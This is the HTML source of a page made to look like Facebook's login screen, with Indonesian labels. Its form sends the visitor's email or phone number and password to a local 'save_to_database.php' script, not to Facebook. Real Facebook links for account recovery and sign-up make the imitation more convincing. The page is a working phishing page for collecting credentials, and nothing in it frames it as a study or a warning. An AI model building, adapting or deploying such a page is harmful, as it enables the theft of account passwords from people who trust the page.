<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #3b5998; /* Facebook blue */
            color: blue;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        #fb-login-container {
            background: white;
            padding: 50px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }
        h1 {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            color: white;
            background-color: #4267B2; /* Facebook button color */
            border: none;
            border-radius: 5px;
            width: 100%;
        }
        .guest-mode {
            color: blue;
            text-decoration: none;
        }
        .create-account {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            color: white;
            background-color: green; /* Button color */
            border: none;
            border-radius: 5px;
            text-decoration: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div id="fb-login-container">
        <h1>Facebook</h1>
        <form method="post" action="save_to_database.php">
            <input type="text" name="email" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Masuk</button>
            <br><br>
            <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="guest-mode">Lupa akun</a><br><br>
            <a href="https://web.facebook.com/r.php?_rdc=1&_rdr" class="create-account">Buat akun baru</a>
        </form>
    </div>
</body>
</html>
